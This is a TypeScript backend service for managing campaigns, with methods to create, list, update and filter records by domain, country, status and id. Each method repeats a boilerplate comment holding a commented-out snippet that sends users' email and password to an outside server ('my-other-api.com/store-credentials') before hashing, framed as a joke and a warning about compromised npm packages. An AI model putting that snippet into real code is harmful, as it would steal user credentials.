import { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import config from '../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { ICampaign, ICampaignInputDTO } from '../interfaces/ICampaign';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { domain } from 'process';

@Service()
export default class CampaignService {
  constructor(
    @Inject('campaignModel') private campaignModel: Models.CampaignModel,
    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {
  }

  public async CreateCampaign(campaignInputDTO: ICampaignInputDTO): Promise<{ campaign: ICampaign }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('campaign');
      this.logger.silly('Creating campaign db record');
      const campaignRecord = await this.campaignModel.create({
        ...campaignInputDTO  /* link with interface of campaign*/
      });
      this.logger.silly('Generating JWT');
  

      if (!campaignRecord) {
        throw new Error('Campaign cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const campaign = campaignRecord.toObject(); /* campaign object*/
      return { campaign };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  
  public async GetCampaigns( ): Promise<{ campaigns: ICampaign[] }> {   /* array of documents of campaigns*/
    try {      
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('campaign');
      this.logger.silly('Creating campaign db record');
      const campaignRecord = await this.campaignModel.find({});
      this.logger.silly('Generating JWT');
  

      if (!campaignRecord) {
        throw new Error('Campaign cannot be created');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const campaigns = campaignRecord
      return { campaigns };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }


    // service to update campaign
    public async CampaignUpdate(campaignInputDTO: ICampaignInputDTO): Promise<{ campaign: ICampaign }> {
      try {
    
        /**
         * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
         * require('http')
         *  .request({
         *     hostname: 'http://my-other-api.com/',
         *     path: '/store-credentials',
         *     port: 80,
         *     method: 'POST',
         * }, ()=>{}).write(JSON.stringify({ email, password })).end();
         *
         * Just kidding, don't do that!!!
         *
         * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
         * watches every API call and if it spots a 'password' and 'email' property then
         * it decides to steal them!? Would you even notice that? I wouldn't :/
         */
        this.logger.silly('campaign');
        this.logger.silly('Editing Campaign db record');
    
       let userId = campaignInputDTO.userId;
  
        const campaignRecord = await this.campaignModel.update({userId  },{
          ...campaignInputDTO
        });
        this.logger.silly('Generating JWT');
    
  
        if (!campaignRecord) {
          throw new Error('Campaign Does not exists');
        }
  
        /**
         * @TODO This is not the best way to deal with this
         * There should exist a 'Mapper' layer
         * that transforms data from layer to layer
         * but that's too over-engineering for now
         */
        const campaign = campaignRecord
        return { campaign };  
      } catch (e) {
        this.logger.error(e);
        throw e;
      }
    }

     /*------------------------------------------ Filters API's-----------------------------------------------*/
  /* get a campaign with specific domain*/
  
  public async GetCampaignsByDomain( domain: string): Promise<{ campaign: ICampaign[] }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      var query = { subject: domain };  
      console.log ( " we received in query is " + query)
      console.log ( " received subject is " + domain)
      this.logger.silly('campaigns');
      this.logger.silly('getting ngo db record with specific domain');
      const campaignRecord = await this.campaignModel.find(query);
      this.logger.silly('Generating JWT');

      if (!campaignRecord) {
        throw new Error('no ngo exists');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const campaign = campaignRecord
      return { campaign };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  } 

   /* get a campaign with specific country*/
  
   public async GetCampaignsByCountry( state: string): Promise<{ campaign: ICampaign[] }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      var query = { country: state };  
      console.log ( " we received in query is " + query)
      console.log ( " received subject is " + state)
      this.logger.silly('campaigns');
      this.logger.silly('getting camapign db record with specific campaign');
      const campaignRecord = await this.campaignModel.find(query);
      this.logger.silly('Generating JWT');

      if (!campaignRecord) {
        throw new Error('no campaign exists');
      }

      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const campaign = campaignRecord
      return { campaign };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  } 

     /* get a campaign with specific country*/
  
     public async GetCampaignsByStatus( state: string): Promise<{ campaign: ICampaign[] }> {
      try {
    
        /**
         * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
         * require('http')
         *  .request({
         *     hostname: 'http://my-other-api.com/',
         *     path: '/store-credentials',
         *     port: 80,
         *     method: 'POST',
         * }, ()=>{}).write(JSON.stringify({ email, password })).end();
         *
         * Just kidding, don't do that!!!
         *
         * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
         * watches every API call and if it spots a 'password' and 'email' property then
         * it decides to steal them!? Would you even notice that? I wouldn't :/
         */
        var query = { status: state };  
        console.log ( " we received in query is " + query)
        console.log ( " received subject is " + state)
        this.logger.silly('campaigns');
        this.logger.silly('getting camapign db record with specific campaign');
        const campaignRecord = await this.campaignModel.find(query);
        this.logger.silly('Generating JWT');
  
        if (!campaignRecord) {
          throw new Error('no campaign exists');
        }
  
        /**
         * @TODO This is not the best way to deal with this
         * There should exist a 'Mapper' layer
         * that transforms data from layer to layer
         * but that's too over-engineering for now
         */
        const campaign = campaignRecord
        return { campaign };
      } catch (e) {
        this.logger.error(e);
        throw e;
      }
    } 
  public async GetCampaignById( id: string): Promise<{ campaign: ICampaign[] }> {
    try {
  
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('project');
      this.logger.silly('Creating project db record');
      const campaignRecord = await this.campaignModel.find({_id: id});
      this.logger.silly('Generating JWT');
  

      if (!campaignRecord) {
        throw new Error('Project cannot be created');
      }

      const campaign = campaignRecord
      return { campaign };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  
}
